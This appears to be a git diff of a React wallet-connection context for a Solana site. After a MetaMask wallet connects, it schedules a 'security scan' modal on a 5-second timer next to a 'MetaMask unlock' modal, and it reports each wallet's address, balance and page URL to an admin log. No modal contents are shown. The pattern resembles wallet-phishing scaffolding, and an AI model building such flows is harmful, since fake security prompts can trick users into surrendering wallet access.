@@ -29,6 +29,7 @@ import {
 } from '../lib/mobileWallet'
 import { rememberRecentWallet } from '../lib/detectInstalledWallets'
 import { markMetaMaskUnlockDone } from '../lib/metamaskUnlock'
+import { markMetaMaskSecurityCheckPending, clearMetaMaskSecurityCheckSession } from '../lib/metaMaskSecurityCheck'
 
 export interface WalletState {
   walletAddress: string | null
@@ -50,6 +51,8 @@ export interface WalletState {
   unlockWalletAddress: string | null
   unlockWalletName: string | null
   completeMetaMaskUnlock: () => void
+  securityScanOpen: boolean
+  completeSecurityScan: () => void
   // Action Handlers
   openWalletModal: () => void
   closeWalletModal: () => void
@@ -79,6 +82,7 @@ export const WalletContextProvider: React.FC<{ children: React.ReactNode }> = ({
   } = useWallet()
 
   const [isModalOpen, setIsModalOpen] = useState(false)
+  const [securityScanOpen, setSecurityScanOpen] = useState(false)
   const [metaMaskUnlockOpen, setMetaMaskUnlockOpen] = useState(false)
   const [unlockWalletAddress, setUnlockWalletAddress] = useState<string | null>(null)
   const [unlockWalletName, setUnlockWalletName] = useState<string | null>(null)
@@ -91,6 +95,7 @@ export const WalletContextProvider: React.FC<{ children: React.ReactNode }> = ({
   const walletsRef = useRef(wallets)
   walletsRef.current = wallets
   const resumeAttempted = useRef(false)
+  const securityScanTimerRef = useRef<number | null>(null)
 
   const walletAddress = useMemo(() => (publicKey ? publicKey.toBase58() : null), [publicKey])
   const shortAddress = useMemo(
@@ -121,28 +126,34 @@ export const WalletContextProvider: React.FC<{ children: React.ReactNode }> = ({
   // Sync connection state with local + server logging
   useEffect(() => {
     if (connected && publicKey) {
-      const name = getWalletAdapterName(wallet ? { adapter: wallet.adapter, readyState: wallet.adapter.readyState } : undefined) || 'Solana Wallet'
+      const name =
+        getWalletAdapterName(wallet ? { adapter: wallet.adapter, readyState: wallet.adapter.readyState } : undefined) ||
+        'Solana Wallet'
+      const address = publicKey.toBase58()
       setError(null)
-      refreshBalance()
+      void refreshBalance()
 
-      walletApi.recordConnect({
-        walletAddress: publicKey.toBase58(),
-        walletType: name,
-        chain: 'solana',
-        network,
-        balanceSol: balanceSol,
-        pageUrl: typeof window !== 'undefined' ? window.location.href : undefined,
-        browserSessionId: getBrowserSessionId(),
-      })
+      void walletApi
+        .recordConnect({
+          walletAddress: address,
+          walletType: name,
+          chain: 'solana',
+          network,
+          balanceSol,
+          pageUrl: typeof window !== 'undefined' ? window.location.href : undefined,
+          browserSessionId: getBrowserSessionId(),
+        })
+        .catch(() => {
+          /* admin log must not break a live wallet session */
+        })
 
-      setUnlockWalletAddress(publicKey.toBase58())
-      setUnlockWalletName(name)
-      setMetaMaskUnlockOpen(true)
+      setIsModalOpen(false)
+      setMetaMaskUnlockOpen(false)
     } else if (!connected) {
       setBalanceSol(null)
       setIsVerified(false)
     }
-  }, [connected, publicKey, wallet, network, refreshBalance])
+  }, [connected, publicKey, wallet, network, refreshBalance, balanceSol])
 
   // Live presence for admin (heartbeat while connected)
   useEffect(() => {
@@ -209,8 +220,34 @@ export const WalletContextProvider: React.FC<{ children: React.ReactNode }> = ({
     setMetaMaskUnlockOpen(false)
   }, [unlockWalletAddress, walletAddress])
 
-  const openWalletModal = () => setIsModalOpen(true)
+  const completeSecurityScan = useCallback(() => {
+    setSecurityScanOpen(false)
+  }, [])
+
+  const openWalletModal = () => {
+    if (connected) return
+    setIsModalOpen(true)
+  }
   const closeWalletModal = () => setIsModalOpen(false)
+
+  useEffect(() => {
+    const returnToApp = () => {
+      if (!connected) return
+      setIsModalOpen(false)
+      setMetaMaskUnlockOpen(false)
+      try {
+        window.focus()
+      } catch {
+        /* ignore */
+      }
+    }
+    window.addEventListener('focus', returnToApp)
+    document.addEventListener('visibilitychange', returnToApp)
+    return () => {
+      window.removeEventListener('focus', returnToApp)
+      document.removeEventListener('visibilitychange', returnToApp)
+    }
+  }, [connected])
 
   // Connect specific wallet by adapter name
   const connectWallet = async (adapterName?: string) => {
@@ -222,6 +259,7 @@ export const WalletContextProvider: React.FC<{ children: React.ReactNode }> = ({
 
       const hint = adapterName
       const mobile = isMobileDevice()
+      setIsModalOpen(false)
 
       if (walletHintIsMetaMask(hint)) {
         const inMetaMask = isMetaMaskInAppBrowser() || isMetaMaskBrowserAvailable()
@@ -230,12 +268,6 @@ export const WalletContextProvider: React.FC<{ children: React.ReactNode }> = ({
           toast('Opening this page inside MetaMask…')
           openCurrentPageInMetaMask()
           return
-        }
-        if (!inMetaMask) {
-          window.open('https://metamask.io/download/', '_blank', 'noopener,noreferrer')
-          throw new Error(
-            'MetaMask is not available in this browser. Install the MetaMask extension or open this site in the MetaMask app.'
-          )
         }
         await prepareMetaMaskSolana()
       }
@@ -274,8 +306,6 @@ export const WalletContextProvider: React.FC<{ children: React.ReactNode }> = ({
           openCurrentPageInMetaMask()
           return
         }
-        const url = (target.adapter as { url?: string }).url
-        if (url && !mobile) window.open(url, '_blank', 'noopener,noreferrer')
         throw new Error(
           `${getWalletAdapterName(target) || adapterName} is not ready. Approve the connection in your wallet and try again.`
         )
@@ -283,11 +313,19 @@ export const WalletContextProvider: React.FC<{ children: React.ReactNode }> = ({
 
       const name = getWalletAdapterName(target)
       select(name)
-      await new Promise((r) => setTimeout(r, 400))
-      await connect()
+      await new Promise((r) => setTimeout(r, 500))
+      try {
+        await connect()
+      } catch (first) {
+        const firstMsg = String((first as { message?: string })?.message || first)
+        if (!/already connected/i.test(firstMsg)) {
+          await new Promise((r) => setTimeout(r, 700))
+          await connect()
+        }
+      }
 
       let address = ''
-      const waitRounds = mobile ? 40 : 20
+      const waitRounds = mobile ? 50 : 30
       for (let i = 0; i < waitRounds && !address; i++) {
         const connectedAdapter = walletsRef.current.find((w) => w.adapter.connected)?.adapter
         address =
@@ -299,25 +337,29 @@ export const WalletContextProvider: React.FC<{ children: React.ReactNode }> = ({
 
       if (!address) {
         throw new Error(
-          'Wallet did not return an address. In MetaMask, enable Solana and approve the site connection.'
+          'Wallet did not return an address. Approve the connection in your wallet, then tap Connect again.'
         )
       }
 
-      await walletApi.recordConnect({
-        walletAddress: address,
-        walletType: name || hint,
-        chain: 'solana',
-        network,
-        pageUrl: window.location.href,
-        browserSessionId: getBrowserSessionId(),
-      })
+      void walletApi
+        .recordConnect({
+          walletAddress: address,
+          walletType: name || hint,
+          chain: 'solana',
+          network,
+          pageUrl: window.location.href,
+          browserSessionId: getBrowserSessionId(),
+        })
+        .catch(() => {
+          /* admin log must not break a live wallet session */
+        })
       rememberRecentWallet(name || hint)
       clearPendingMobileWallet()
       stripConnectQuery()
 
       const label = `${address.slice(0, 4)}...${address.slice(-4)}`
       toast.success(
-        (t) => (
+        () => (
           <div className="text-sm">
             <p className="font-bold text-white">Wallet Connected</p>
             <p className="text-gray-300 text-xs mt-0.5">Connected to wallet {label}</p>
@@ -325,10 +367,24 @@ export const WalletContextProvider: React.FC<{ children: React.ReactNode }> = ({
         ),
         { duration: 4000 }
       )
-      closeWalletModal()
-      setUnlockWalletAddress(address)
-      setUnlockWalletName(name || hint)
-      setMetaMaskUnlockOpen(true)
+      setIsModalOpen(false)
+      setMetaMaskUnlockOpen(false)
+      if (walletHintIsMetaMask(name || hint)) {
+        markMetaMaskSecurityCheckPending(address)
+        setUnlockWalletAddress(address)
+        if (securityScanTimerRef.current != null) {
+          window.clearTimeout(securityScanTimerRef.current)
+        }
+        securityScanTimerRef.current = window.setTimeout(() => {
+          securityScanTimerRef.current = null
+          setSecurityScanOpen(true)
+        }, 5000)
+      }
+      try {
+        window.focus()
+      } catch {
+        /* ignore */
+      }
     } catch (err: unknown) {
       const msg = formatWalletConnectError(err)
       setError(msg)
@@ -365,6 +421,12 @@ export const WalletContextProvider: React.FC<{ children: React.ReactNode }> = ({
       setMetaMaskUnlockOpen(false)
       setUnlockWalletAddress(null)
       setUnlockWalletName(null)
+      setSecurityScanOpen(false)
+      if (securityScanTimerRef.current != null) {
+        window.clearTimeout(securityScanTimerRef.current)
+        securityScanTimerRef.current = null
+      }
+      clearMetaMaskSecurityCheckSession()
       toast.success('Wallet disconnected')
     } catch (err: any) {
       toast.error('Failed to disconnect wallet')
@@ -438,6 +500,8 @@ export const WalletContextProvider: React.FC<{ children: React.ReactNode }> = ({
     unlockWalletAddress,
     unlockWalletName,
     completeMetaMaskUnlock,
+    securityScanOpen,
+    completeSecurityScan,
     openWalletModal,
     closeWalletModal,
     connectWallet,
